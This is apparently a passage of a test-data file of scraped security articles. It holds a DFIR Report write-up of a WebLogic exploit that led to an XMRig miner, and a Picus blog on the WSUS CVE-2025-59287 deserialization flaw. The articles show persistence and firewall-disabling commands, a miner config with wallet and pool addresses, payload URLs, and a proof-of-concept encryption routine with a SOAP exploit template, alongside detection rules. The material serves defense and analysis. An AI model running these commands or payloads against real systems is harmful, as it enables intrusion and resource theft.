duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times. Impact We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21 We also observed connection from [kthreaddi].exe talking to crypto mining pools Eventually, the crypto mining operation will cause performance issue with the WebLogic server. XMRig Config file { \"api\": { \"id\": null, \"worker-id\": null }, \"autosave\": false, \"background\": true, \"randomx\": { \"init\": -1, \"mode\": \"auto\", \"1gb-pages\": false, \"rdmsr\": true, \"wrmsr\": true, \"cache_qos\": false, \"numa\": true, \"scratchpad_prefetch_mode\": 1 }, \"cpu\": { \"enabled\": true, \"huge-pages\": true, \"huge-pages-jit\": false, \"hw-aes\": null, \"priority\": null, \"memory-pool\": false, \"yield\": true, \"max-threads-hint\": 100, \"asm\": true, \"argon2-impl\": null, \"astrobwt-max-size\": 550, \"cn/0\": false, \"cn-lite/0\": false, \"kawpow\": false }, \"donate-level\": 0, \"donate-over-proxy\": 0, \"log-file\": null, \"pools\": [ { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr-eu2.nanopool.org:14444\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.w\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"m-select\": null }, { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr.f2pool.com:13531\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"self-select\": null } ], \"retries\": 5, \"retry-pause\": 5, \"syslog\": false, \"user-agent\": null, \"verbose\": 0, \"watch\": false, \"pause-on-battery\": false } IOCs Files: Ldr.ps1 d8a0ad2486c9662c8ac8c4370c7986bdc02dc6bdb8155dcc537f10dd00252d1d Sys.exe 618a1d0e1e1f6d0a34a5ab6c08acf058ffe46938f53b3357f388df1c7909fc45 Sysvr013.exe 80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96 [kthreaddi].exe a2f3ecd329d2713855257bf922b8a092cbb1193327ba197351804275286df7dd Network: Exploit Source IP 191[.]252[.]219[.]71 http://194.145.227[.]21/poc.xml http://194.145.227[.]21/pocwin.xml http://194.145.227[.]21/ldr.ps1 Detection Sigma please note that you need to enable webserver logging on the WebLogic server https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2020_14882_weblogic_exploit.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_schtask_creation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_direct_asep_reg_keys_modification.yml Snort SERVER-WEBAPP Oracle WebLogic Server command injection attempt https://www.snort.org/rule_docs/1-56202 Suricata ET INFO Executable Download from dotted-quad Host AV POLICY HTTP request for .exe file with no User-Agent ET CURRENT_EVENTS Terse alphanumeric executable downloader high likelihood of being hostile ET INFO Packed Executable Download ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download ET INFO SUSPICIOUS Dotted Quad Host MZ Response ET POLICY Cryptocurrency Miner Checkin ETPRO POLICY XMR CoinMiner Usage ETPRO TROJAN CoinMiner Known Malicious Stratum Authline YARA /* YARA Rule Set Author: The DFIR Report Date: 2021-06-03 Identifier: 3580 WebLogic XMRig Miner Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule sysrv013 { meta: description = \"files - file sysrv013.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-06-03\" hash1 = \"80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96\" strings: $s1 = \"eDumped\" fullword ascii $s2 = \"OGhZVFNVRms6\" fullword ascii /* base64 encoded string '8hYTSUFk:' */ $s3 = \"sdumpsebslemW^\" fullword ascii $s4 = \":ERNEL32.DLLODe?\" fullword ascii $s5 = \"pircsek\" fullword ascii $s6 = \"IDE5NC4xNDUu\" fullword ascii /* base64 encoded string ' 194.145.' */ $s7 = \"333444\" ascii /* reversed goodware string '444333' */ $s8 = \"aHx8d2dldCAtLXVzZXItYW\" fullword ascii /* base64 encoded string 'h||wget --user-a' */ $s9 = \"h -c {%\" fullword ascii $s10 = \"?$?)?2?9?{\" fullword ascii /* hex encoded string ')' */ $s11 = \";5A;6D2!D\" fullword ascii /* hex encoded string 'Zm-' */ $s12 = \"3GRAt\\\\5\" fullword ascii $s13 = \"Gorget{\" fullword ascii $s14 = \"7!7&7,727\" fullword ascii /* hex encoded string 'ww'' */ $s15 = \"* {5C;\" fullword ascii $s16 = \"fsftp_fC\" fullword ascii $s17 = \"POSTulL\" fullword ascii $s18 = \"gogetv/\" fullword ascii $s19 = \"\\\\x86+.pdb\" fullword ascii $s20 = \"_DIRCWD?\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 10000KB and ( pe.imphash() == \"406f4cbdf82bde91761650ca44a3831a\" or 8 of them ) } MITRE Exploit Public-Facing Application \u2013 T1190 Command and Scripting Interpreter: PowerShell \u2013 T1059.001 Command and Scripting Interpreter: Windows Command Shell \u2013 T1059.003 Scheduled Task/Job: Scheduled Task \u2013 T1053.005 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder \u2013 T1547.001 Impair Defenses: Disable or Modify System Firewall \u2013 T1562.004 Masquerading: Masquerade Task or Service \u2013 T1036.004 Process Discovery \u2013 T1057 System Network Connections Discovery \u2013 T1049 Ingress Tool Transfer \u2013 T1105 Application Layer Protocol: Web Protocols \u2013 T1071.001 Resource Hijacking \u2013 T1496 Internal case 3580 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Conti Ransomware From Word to Lateral Movement in 1 Hour Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "WebLogic RCE Leads to XMRig \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts cryptominer CVE-2020-14882 WebLogic RCE Leads to XMRig June 3, 2021 Intro This report will review an intrusion where, the threat actor took advantage of a WebLogic remote code execution vulnerability (CVE-2020\u201314882) to gain initial access to the system before installing a coin miner (XMRig). Summary In the attack, the threat actor took around 2 minutes from initial access, to running a persistent coin miner. The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion. The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code. The payload then ran a PowerShell command to download a PowerShell script from a remote server. This script downloaded a loader and executed it, then it enabled persistence mechanisms. Next, the loader downloaded XMRig, and started the mining process. While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting. Analysis and reporting completed by @tas_kmanager and @TheDFIRReport Reviewed by @iiamaleks and @samaritan_o MITRE ATT&CK Initial Access Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882. This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product. [ 1 ] We previously reported on an intrusion that also used this exploit and ended in a coin miner. This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication. Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server. In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request. The detailed payload in the header can be observed below: Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml . This technique is listed in PoC developed by Jang. [ 2 ] Below we can see the payload inside of the xml file hosted in the attacker server. The payload will execute the PowerShell command on the vulnerable system. Execution The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system. Next, let us investigate the content of the PowerShell script (ldr.ps1) On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe. The next line sets up random characters to be appended to the payload executable. This binary (renamed to sysvr013.exe ) was then executed by the same script. Persistence There are several persistence mechanisms observed. The first one utilizes schtasks to create a task called \u201c BrowserUpdate \u201d. schtasks /create /F /sc minute /mo 1 /tn \"BrowserUpdate\" /tr \"$dst\" It also created a registry run key to execute the miner binary on reboot. We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task. Privilege Escalation No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start. Defense Evasion From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team. We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked. netsh advfirewall set allprofiles state off As noted above, the attacker created a task called \u201c BrowserUpdate \u201d to masquerade the scheduled task as a web browser update task. Discovery We can see several local discovery commands executed from the PowerShell script. They are looking for existing mining process on the machine, such as kthreaddi , sysrv , etc. They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc. This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times. Impact We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21 We also observed connection from [kthreaddi].exe talking to crypto mining pools Eventually, the crypto mining operation will cause performance issue with the WebLogic server. XMRig Config file { \"api\": { \"id\": null, \"worker-id\": null }, \"autosave\": false, \"background\": true, \"randomx\": { \"init\": -1, \"mode\": \"auto\", \"1gb-pages\": false, \"rdmsr\": true, \"wrmsr\": true, \"cache_qos\": false, \"numa\": true, \"scratchpad_prefetch_mode\": 1 }, \"cpu\": { \"enabled\": true, \"huge-pages\": true, \"huge-pages-jit\": false, \"hw-aes\": null, \"priority\": null, \"memory-pool\": false, \"yield\": true, \"max-threads-hint\": 100, \"asm\": true, \"argon2-impl\": null, \"astrobwt-max-size\": 550, \"cn/0\": false, \"cn-lite/0\": false, \"kawpow\": false }, \"donate-level\": 0, \"donate-over-proxy\": 0, \"log-file\": null, \"pools\": [ { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr-eu2.nanopool.org:14444\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.w\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"m-select\": null }, { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr.f2pool.com:13531\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"self-select\": null } ], \"retries\": 5, \"retry-pause\": 5, \"syslog\": false, \"user-agent\": null, \"verbose\": 0, \"watch\": false, \"pause-on-battery\": false } IOCs Files: Ldr.ps1 d8a0ad2486c9662c8ac8c4370c7986bdc02dc6bdb8155dcc537f10dd00252d1d Sys.exe 618a1d0e1e1f6d0a34a5ab6c08acf058ffe46938f53b3357f388df1c7909fc45 Sysvr013.exe 80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96 [kthreaddi].exe a2f3ecd329d2713855257bf922b8a092cbb1193327ba197351804275286df7dd Network: Exploit Source IP 191[.]252[.]219[.]71 http://194.145.227[.]21/poc.xml http://194.145.227[.]21/pocwin.xml http://194.145.227[.]21/ldr.ps1 Detection Sigma please note that you need to enable webserver logging on the WebLogic server https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2020_14882_weblogic_exploit.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_schtask_creation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_direct_asep_reg_keys_modification.yml Snort SERVER-WEBAPP Oracle WebLogic Server command injection attempt https://www.snort.org/rule_docs/1-56202 Suricata ET INFO Executable Download from dotted-quad Host AV POLICY HTTP request for .exe file with no User-Agent ET CURRENT_EVENTS Terse alphanumeric executable downloader high likelihood of being hostile ET INFO Packed Executable Download ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download ET INFO SUSPICIOUS Dotted Quad Host MZ Response ET POLICY Cryptocurrency Miner Checkin ETPRO POLICY XMR CoinMiner Usage ETPRO TROJAN CoinMiner Known Malicious Stratum Authline YARA /* YARA Rule Set Author: The DFIR Report Date: 2021-06-03 Identifier: 3580 WebLogic XMRig Miner Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule sysrv013 { meta: description = \"files - file sysrv013.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-06-03\" hash1 = \"80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96\" strings: $s1 = \"eDumped\" fullword ascii $s2 = \"OGhZVFNVRms6\" fullword ascii /* base64 encoded string '8hYTSUFk:' */ $s3 = \"sdumpsebslemW^\" fullword ascii $s4 = \":ERNEL32.DLLODe?\" fullword ascii $s5 = \"pircsek\" fullword ascii $s6 = \"IDE5NC4xNDUu\" fullword ascii /* base64 encoded string ' 194.145.' */ $s7 = \"333444\" ascii /* reversed goodware string '444333' */ $s8 = \"aHx8d2dldCAtLXVzZXItYW\" fullword ascii /* base64 encoded string 'h||wget --user-a' */ $s9 = \"h -c {%\" fullword ascii $s10 = \"?$?)?2?9?{\" fullword ascii /* hex encoded string ')' */ $s11 = \";5A;6D2!D\" fullword ascii /* hex encoded string 'Zm-' */ $s12 = \"3GRAt\\\\5\" fullword ascii $s13 = \"Gorget{\" fullword ascii $s14 = \"7!7&7,727\" fullword ascii /* hex encoded string 'ww'' */ $s15 = \"* {5C;\" fullword ascii $s16 = \"fsftp_fC\" fullword ascii $s17 = \"POSTulL\" fullword ascii $s18 = \"gogetv/\" fullword ascii $s19 = \"\\\\x86+.pdb\" fullword ascii $s20 = \"_DIRCWD?\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 10000KB and ( pe.imphash() == \"406f4cbdf82bde91761650ca44a3831a\" or 8 of them ) } MITRE Exploit Public-Facing Application \u2013 T1190 Command and Scripting Interpreter: PowerShell \u2013 T1059.001 Command and Scripting Interpreter: Windows Command Shell \u2013 T1059.003 Scheduled Task/Job: Scheduled Task \u2013 T1053.005 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder \u2013 T1547.001 Impair Defenses: Disable or Modify System Firewall \u2013 T1562.004 Masquerading: Masquerade Task or Service \u2013 T1036.004 Process Discovery \u2013 T1057 System Network Connections Discovery \u2013 T1049 Ingress Tool Transfer \u2013 T1105 Application Layer Protocol: Web Protocols \u2013 T1071.001 Resource Hijacking \u2013 T1496 Internal case 3580 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Conti Ransomware From Word to Lateral Movement in 1 Hour Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 0
  },
  {
    "url": "http://127.0.0.1:8001/articles/1523",
    "title": "CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability",
    "content": "CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability Free Trial | Login Free Trial Login Platform Platform Picus Security Validation Platform Exposure Validation Security Control Validation Attack Surface Validation Cloud Security Validation Attack Path Validation Detection Rule Validation Integrations and Supported Technologies I want to Request a Demo Start a Trial REPORT Picus Red Report 2026 DATASHEET Security Validation Platform Use Cases Use Cases Breach and Attack Simulation Automated Penetration Testing Adversarial Exposure Validation Frameworks CTEM MITRE ATT&CK\u00ae Digital Operational Resiliency Act (DORA) Health Insurance Portability and Accountability Act (HIPAA) NIST Cybersecurity Framework (CSF) Industry Healthcare Financial Institutions IT/OT WHITEPAPER Building a Robust Defense-in-Depth Strategy with Breach and Attack Simulation (BAS) E-BOOK An Introduction to Exposure Validation Research RESEARCH Picus Labs Red Report Blue Report Actionable Threat Intelligence Report Emerging Threat Simulator LEARNING Emerging Threats Purple Academy Cybersecurity 101 Whitepaper Modernize Your SOC with Breach and Attack Simulation REPORT Blue Report: Effective Threat Exposure Management Resources RESOURCES Blog Reports Purple Academy Webinars Case Studies Datasheets Events Resource Library LEARNING Purple Academy Cybersecurity 101 Emerging Threats WHITEPAPER Double Your Threat Blocking in 90 Days E-BOOK An Introduction to Exposure Validation Company COMPANY About Us Leadership Press Releases Events Careers PARTNERS Partner Program Technology Alliance Program WATCH ON-DEMAND: The BAS Summit: Redefining Attack Simulation through AI DATASHEET The Pioneer of Breach & Attack Simulation GET A DEMO Home Blog CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability Picus Labs | 8 MIN READ | October 25, 2025 Summarize with: ChatGPT perplexity Google AI On 24 October 2025, Microsoft released an out-of-band security update for CVE-2025-59287 , a critical (CVSS 9.8) remote code execution vulnerability in the WSUS Server Role on Windows Server (2012/2012 R2, 2016, 2019, 2022, and 2025). The flaw stems from unsafe deserialization in WSUS\u2019s reporting web services, enabling a remote, unauthenticated attacker to send crafted requests and execute arbitrary code with SYSTEM privileges on a vulnerable server. Microsoft confirmed that the October Patch Tuesday update did not fully mitigate the issue and urged immediate deployment of the new out-of-band patches [1]. As exploitation activity has already been detected in the wild, making prompt remediation critical for all WSUS-enabled environments [2]. This blog examines the WSUS service, the root cause of CVE-2025-59287, available proof-of-concept exploits, and the recommended mitigation and workaround strategies. Simulate Vulnerability Exploitation Attacks with 14-Day Free Trial of Picus Platform What Is Windows Server Update Services (WSUS)? Windows Server Update Services (WSUS) is a Windows Server role that allows organizations to centrally manage, approve, and distribute Microsoft updates across all Windows endpoints in their environment. Instead of each machine connecting directly to Microsoft Update over the internet, WSUS acts as an internal update repository , improving control, bandwidth efficiency, and compliance. Client systems periodically communicate with the WSUS server over HTTP (port 8530) or HTTPS (port 8531) to request update metadata and download approved patches. Administrators can define update policies, automate deployment schedules, and monitor update status across the network, making WSUS a key infrastructure component in enterprise patch management and compliance operations. What Is the Technical Root Cause of CVE-2025-59287 RCE? The vulnerability lies within the WSUS component responsible for handling the AuthorizationCookie objects, specifically in the Microsoft.UpdateServices.Internal.Authorization.EncryptionHelper.DecryptData() method. The Deserialization Flaw The core issue is the use of the insecure .NET BinaryFormatter for deserializing encrypted cookie data without proper type validation. When an authorization cookie is received via the GetCookie() SOAP endpoint, the server attempts to decrypt and deserialize its contents. As shown in the provided source code snippet, after decryption, the data is passed directly to the BinaryFormatter.Deserialize() method if the object is not of the hardcoded type UnencryptedCookieData : // Source snippet from DecryptData method // ... (Decryption logic using AES-128-CBC) else { BinaryFormatter binaryFormatter = new BinaryFormatter(); MemoryStream memoryStream = new MemoryStream( array ); try { obj = binaryFormatter.Deserialize(memoryStream); // <-- VULNERABLE CALL } catch (Exception ex2) // ... if (obj.GetType() != this .classType) { throw new LoggedArgumentException( \"Decrypted cookie has the wrong data type. Expected type = \" + this .classType.ToString() + \", actual type = \" + obj.GetType().ToString(), \"cookieData\" ); } } return obj; } The use of BinaryFormatter.Deserialize() on arbitrary user-controllable input (the encrypted cookie data) is a classic unsafe deserialization vulnerability. An attacker can craft a malicious gadget chain payload (often generated using tools like ysoserial.net ) that, when deserialized by BinaryFormatter , forces the application to execute arbitrary code. Since the WSUS service often runs with high privileges (e.g., SYSTEM ), this leads to a critical RCE. Vulnerability Flow: GetCookie to RCE The exploitation flow is as follows. An unauthenticated attacker sends a crafted SOAP request to the /ClientWebService/Client.asmx endpoint, calling the GetCookie method. The request includes a specially constructed AuthorizationCookie with a CookieData field containing the encrypted malicious payload. The payload is a Base64-encoded, AES-128-CBC encrypted gadget chain. The request reaches the AuthorizationManager.GetCookie method, which calls CrackAuthorizationCookies , leading to CrackAuthorizationCookie , and finally to the vulnerable EncryptionHelper.DecryptData() . DecryptData uses a hardcoded AES key to decrypt the payload. The decrypted payload is deserialized by BinaryFormatter , executing the attacker's code with SYSTEM privileges . CVE-2025-59287 PoC: How Attackers Exploit WSUS Deserialization Flaw The exploitation involves two main parts: a payload generator and the SOAP request [3]. 1. Payload Generation (Encryption Logic) The following C# code snippet illustrates how the serialized gadget chain (from ysoserial.net ) is encrypted using the hardcoded key and an IV of all zeros: // Proof-of-Concept (PoC) Encryption Logic static byte[] EncryptPayload(byte[] data, byte[] key) { using (var aes = new AesCryptoServiceProvider()) { aes.Key = key; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.None; aes.IV = new byte[ 16 ]; // null IV byte[] salt = new byte[ 16 ]; new RNGCryptoServiceProvider().GetNonZeroBytes(salt); using (var encryptor = aes.CreateEncryptor()) { // ... (Custom block padding and transformation logic to match WSUS implementation) // The result is the encrypted cookie data including the salt/IV block. } } } The ysooo string below is a Base64-encoded serialized object (likely an IComparer gadget chain) that, upon deserialization, triggers a command like cmd.exe /c calc . // Serialized Gadget Chain (Partial, for illustration) string ysooo = \"AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCA...\" ; 2. SOAP Request Template The final encrypted payload ( [GENERATED PAYLOAD] ) is placed into the AuthorizationCookie element of a SOAP request to the GetCookie endpoint: POST /ClientWebService/Client.asmx HTTP/ 1.1 Host: WSUS-SERVER: 8530 Content-Type: text/xml; charset=utf -8 SOAPAction: \"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie\" Content-Length: 3632 <?xml version= \"1.0\" encoding= \"utf-8\" ?> <soap:Envelope xmlns:soap= \"http://schemas.xmlsoap.org/soap/envelope/\" > <soap:Body> <GetCookie xmlns= \"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService\" > <authCookies> <AuthorizationCookie> <PlugInId>SimpleTargeting</PlugInId> <CookieData>[GENERATED PAYLOAD]</CookieData> </AuthorizationCookie> </authCookies> <oldCookie xsi:nil= \"true\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" /> <protocolVersion> 1.20 </protocolVersion> </GetCookie> </soap:Body> </soap:Envelope> Observed Exploitation of CVE-2025-59287 in the Wild Threat actors have been observed actively exploiting this vulnerability in the wild, targeting exposed WSUS instances, often on the default ports 8530 and 8531 [2]. Attacker Tradecraft The typical attack chain involves: Sending the malicious SOAP request to the WSUS server. The RCE is triggered, spawning a command interpreter process. The observed process chains indicate execution via the main WSUS processes wsusservice.exe \u2192 cmd.exe \u2192 cmd.exe \u2192 powershell.exe and, w3wp.exe \u2192 cmd.exe \u2192 cmd.exe \u2192 powershell.exe The attacker executes an encoded PowerShell command for enumeration and data exfiltration . Observed commands include: whoami;net user /domain and net user /domain; ipconfig /all . The enumerated data is exfiltrated to a remote URL, often using curl.exe or iwr (Invoke-WebRequest) . Mitigation and Defense Immediate action is required to prevent compromise. Apply the Microsoft Out-of-Band Update Apply the security update released by Microsoft immediately. This patch addresses the vulnerability by implementing secure serialization mechanisms and/or strict type validation, preventing the deserialization of malicious object types. Refer to the official Microsoft Security Response Center (MSRC) advisory for the specific updates for your Windows Server version. Network Isolation and Hardening The vulnerability is unauthenticated and exploitable over the network. Restrict network access to the WSUS service ports ( 8530 /TCP and 8531 /TCP ) to only the clients and management hosts that explicitly require it. Blocking inbound traffic on these ports from the public internet is a critical defense-in-depth measure. Monitoring and Detection System administrators should immediately review logs for signs of exploitation. Artifact Description Detection Focus C:\\inetpub\\logs\\LogFiles\\W3SVC*\\u_ex*.log HTTP service logs POST requests to /ClientWebService/Client.asmx or other WSUS endpoints with large payload sizes or repeated access attempts. Process Creation Logs Windows Event Logs/EDR Child processes ( cmd.exe, powershell.exe ) spawned by wsusservice.exe or w3wp.exe (specifically the WSUS application pool). WSUS Log File C:\\Program Files\\Update Services\\Logfiles\\SoftwareDistribution.log Review for deserialization errors (e.g., System.Reflection.TargetInvocationException) . A Sigma rule for detecting the suspicious child process activity is provided below [2]. # Sigma Rule for Suspicious WSUS Child Process title: Suspicious Windows Update Service Child id: 622c4f64-c277-424a-9a1c-80c73d7243a0 status: experimental description: Detects the activity of a suspicious child spawning from Windows Update Service (WSUS), potential CVE-2025-59287. logsource: category: process_creation product: windows detection: selection_service: ParentImage|endswith: '\\wsusservice.exe' selection_w3wp: ParentImage|endswith: '\\w3wp.exe' ParentCommandLine|contains: 'wsuspool' Image|endswith: '\\cmd.exe' condition: selection_service or selection_w3wp How Picus Simulates WSUS CVE-2025-59287 Unauthenticated RCE Exploitation? We strongly recommend simulating exploited vulnerabilities targeting WSUS and safely emulating the adversarial behaviours observed in CVE-2025-59287 attack campaigns to verify how well your controls stop unauthenticated RCE and post-exploit activity. With the Picus Security Validation Platform , you can also test your defences against other high-profile vulnerabilities, for example CVE-2025-59287, Log4Shell, and ProxyLogon, in minutes using a 14-day free trial . Picus Threat Library includes the following threat for WSUS CVE-2025-59287 RCE attacks. Threat ID Threat Name Attack Module 99677 WSUS Web Attack Campaign Web Application Start simulating emerging threats today and get actionable mitigation insights with a 14-day free trial of the Picus Security Validation Platform. Key Takeaways Date & action: 24 Oct 2025 \u2014 Microsoft released an out-of-band patch for CVE-2025-59287 . Severity: Rated critical (CVSS 9.8) \u2014 unauthenticated remote code execution (RCE). Affected component: WSUS Server Role on Windows Server (2012/2012 R2, 2016, 2019, 2022, 2025). Root cause: Unsafe deserialization \u2014 insecure use of .NET BinaryFormatter in WSUS\u2019s reporting web services. Attack vector: Crafted SOAP requests to /ClientWebService/Client.asmx (GetCookie) containing a malicious AuthorizationCookie. Payload mechanics: Base64 \u2192 AES-128-CBC encrypted gadget chain (deserialized by BinaryFormatter) that triggers arbitrary code execution. Privilege impact: Code executes with SYSTEM privileges (WSUS typically runs at high privilege). Exploitation observed: Active exploitation in the wild \u2014 public PoCs and attacker campaigns reported. Why it\u2019s exploitable: Deserialization runs before strict type validation; BinaryFormatter.Deserialize() accepts attacker-controlled objects. Detection artifacts: suspicious POSTs to /ClientWebService/Client.asmx , large/odd CookieData fields, wsusservice.exe or w3wp.exe spawning cmd.exe \u2192 powershell.exe . Immediate recommendation: Prioritize applying Microsoft\u2019s OOB updates for affected OS versions (do not delay). References [1] \u201cSecurity Update Guide - Microsoft Security Response Center.\u201d Available: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287. [Accessed: Oct. 25, 2025] [2] C. Hudson, J. Maclachlan, J. Minton, J. Hammond, and L. O\u2019Donnell-Welch, \u201cExploitation of Windows Server Update Services Remote Code Execution Vulnerability (CVE-2025-59287),\u201d Huntress. Available: https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability. [Accessed: Oct. 25, 2025] [3] HawkTrace, \u201cCVE-2025-59287 WSUS Remote Code Execution,\u201d HawkTrace Research, Oct. 14, 2025. Available: https://hawktrace.com/blog/CVE-2025-59287. [Accessed: Oct. 25, 2025] Share this: Table of Contents Ready to start? Emerging Threat CVE-2026-21509: APT28 Exploits Microsoft Office Zero-day Vulnerability Learn More Emerging Threat Ni8mare: n8n CVE-2026-21858 Remote Code Execution Vulnerability Explained Learn More Emerging Threat React2Shell RCE Vulnerability: CVE-2025-55182 and CVE-2025-66478 Explained Learn More Emerging Threat FortiWeb CVE-2025-64446 Vulnerability: Path Traversal Leads to Remote Code Execution Learn More Emerging Threat CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability Learn More Emerging Threat Earth Krahang APT Group: Global Government Cyberespionage Campaigns (2022\u20132024) and TTP Analysis Learn More Emerging Threat WARMCOOKIE: A Technical Deep Dive into a Persistent Backdoor's Evolution Learn More Emerging Threat Lazarus Group (APT38) Explained: Timeline, TTPs, and Major Attacks Learn More Emerging Threat Scattered LAPSUS$ Hunters: 2025's Most Dangerous Cybercrime Supergroup Learn More Get the Latest Insights Delivered Straight to Your Inbox Platform The Security Validation Platform Security Control Validation Attack Surface Validation Cloud Security Validation Attack Path Validation Detection Rule Validation Integrations Use Cases Breach and Attack Simulation Automated Penetration Testing Adversarial Exposure Validation Resources Blog Purple Academy Webinars Reports Case Studies Press Releases Datasheets Cyberpedia Events 